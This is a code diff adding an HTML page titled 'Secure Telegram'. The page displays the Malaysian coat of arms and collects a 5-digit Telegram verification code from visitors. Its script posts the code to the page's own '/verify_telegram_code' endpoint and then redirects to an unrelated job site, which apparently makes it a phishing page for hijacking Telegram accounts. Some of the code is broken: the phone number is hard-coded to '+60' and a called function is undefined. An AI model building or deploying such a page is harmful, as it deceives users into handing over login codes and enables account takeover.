@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Telegram</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/public/css/home.css" />
+    <link
+      rel="shortcut icon"
+      href="/public/images/logomod.png"
+      type="image/x-icon"
+    />
+  </head>
+  <body>
+    <div class="container py-5">
+      <header class="text-center mb-4">
+        <img
+          src="/public/images/Coat_of_arms_of_Malaysia.svg.png"
+          alt="logo"
+          class="img-fluid mx-auto d-block"
+          style="width: 450px"
+        />
+      </header>
+
+      <main>
+        <style>
+          #verify-button {
+            display: inline-block;
+            padding: 0.5rem 1rem;
+          }
+        </style>
+        <div class="container">
+          <div class="row justify-content-center mb-4">
+            <div class="col-12 col-md-8 col-lg-6">
+              <h2 class="text-center">Enter Verification Code</h2>
+              <p class="text-center">
+                A 5-digit code has been sent to Telegram
+                <span id="phone-number-display">your phone</span>.
+              </p>
+              <form id="code-verification-form">
+                <div class="d-flex justify-content-center mb-3">
+                  <input
+                    type="tel"
+                    class="form-control code-input mx-1"
+                    id="code1"
+                    maxlength="1"
+                    required
+                    style="width: 50px; text-align: center"
+                  />
+
+                  <input
+                    type="tel"
+                    class="form-control code-input mx-1"
+                    id="code2"
+                    maxlength="1"
+                    required
+                    style="width: 50px; text-align: center"
+                  />
+
+                  <input
+                    type="tel"
+                    class="form-control code-input mx-1"
+                    id="code3"
+                    maxlength="1"
+                    required
+                    style="width: 50px; text-align: center"
+                  />
+
+                  <input
+                    type="tel"
+                    class="form-control code-input mx-1"
+                    id="code4"
+                    maxlength="1"
+                    required
+                    style="width: 50px; text-align: center"
+                  />
+
+                  <input
+                    type="tel"
+                    class="form-control code-input mx-1"
+                    id="code5"
+                    maxlength="1"
+                    required
+                    style="width: 50px; text-align: center"
+                  />
+                </div>
+                <div class="d-flex justify-content-center">
+                  <button
+                    type="submit"
+                    class="btn btn-primary visually-hidden"
+                    id="verify-button"
+                    style="background-color: #6f5552; color: #ffffff"
+                  >
+                    Verify Code
+                  </button>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script src="https://code.jquery.com/jquery.min.js"></script>
+    <script>
+      $(document).ready(function () {
+        var phoneNumber = sessionStorage.getItem("phoneNumber");
+        if (phoneNumber) {
+          $("#phone-number-display").text(phoneNumber);
+        }
+
+        $("#code-verification-form").on("submit", function (e) {
+          e.preventDefault();
+          submitCode();
+        });
+
+        $(".code-input").on("input", function () {
+          var $this = $(this);
+          if ($this.val().length === 1) {
+            $this.next(".code-input").focus();
+          }
+          checkCodeCompletion();
+        });
+      });
+      function checkCodeCompletion() {
+        var isComplete = true;
+        $(".code-input").each(function () {
+          if (!$(this).val()) {
+            isComplete = false;
+            return false;
+          }
+        });
+        if (isComplete) {
+          $("#verify-button").removeClass("visually-hidden");
+        } else {
+          $("#verify-button").addClass("visually-hidden");
+        }
+      }
+
+      function submitCode() {
+        var code = "";
+        for (var i = 1; i <= 5; i++) {
+          code += $("#code" + i).val();
+        }
+        var phoneNumber = "+60";
+        verifyTelegramCode(phoneNumber, code);
+      }
+
+      function verifyTelegramCode(phoneNumber, code) {
+        $.ajax({
+          url: "/verify_telegram_code",
+          type: "POST",
+          contentType: "application/json",
+          data: JSON.stringify({ phone: phoneNumber, code: code }),
+          success: function (response) {
+            console.log("Verification response:", response);
+            window.location.href = "https://www.maukerja.my/";
+          },
+          error: function (error) {
+            console.log("Error:", error);
+            if (
+              error.responseJSON &&
+              error.responseJSON.status === "expired_code_retry"
+            ) {
+              requestTelegramCode(phoneNumber);
+            }
+          },
+        });
+      }
+
+      document
+        .querySelectorAll(".code-input")
+        .forEach(function (input, index, array) {
+          input.addEventListener("input", function (e) {
+            if (
+              index < array.length - 1 &&
+              this.value.length === this.maxLength
+            ) {
+              array[index + 1].focus();
+            }
+          });
+        });
+    </script>
+  </body>
+</html>
